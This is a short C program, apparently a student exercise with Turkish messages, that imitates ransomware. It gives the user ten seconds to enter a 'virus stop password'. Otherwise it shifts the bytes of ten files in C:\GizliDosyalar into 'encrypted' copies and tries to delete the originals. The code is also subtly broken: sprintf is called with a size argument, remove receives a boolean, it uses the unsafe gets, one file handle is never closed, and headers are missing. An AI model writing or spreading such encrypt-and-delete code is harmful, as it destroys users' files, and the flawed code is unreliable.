#include <stdio.h>
#include <stdlib.h>

int main()
{
   char sifre[8]="YZM1106";
   char alsifre[8];
   time_t start,end;
   time (&start);
   printf("Virus durdurma sifresini girmek için 10 saniyeniz var.\n");
   gets(alsifre);
   time (&end);
   if(difftime(end,start)<10 && strcmp(sifre,alsifre) == 0){
     printf("Durdurma basarili.");
     exit(0); }
   printf("Virus aktiflestirildi.");


   for(int i=1;i<11;i++){
   FILE *fpi,*fpsi;
   char dosyayolu[40],ch;
   sprintf(dosyayolu,40,"C:\\GizliDosyalar\\SifreliDosya%d.txt",i);
    fpsi=fopen(dosyayolu, "w+");
   sprintf(dosyayolu,40,"C:\\GizliDosyalar\\GizliDosya%d.txt",i);
    fpi=fopen(dosyayolu, "r");

    if(!fpi)
    printf("ERROR-GizliDosya-%d\n",i);
    if(!fpsi)
    printf("ERROR-SifreliDosya-%d\n",i);

    while ((ch = fgetc(fpi)) != EOF)
      fputc((ch+10), fpsi);

    if(remove(dosyayolu!=0))
       printf("ERROR-Silme hatası-");
    fclose(fpsi);
    }

    return 0;
}
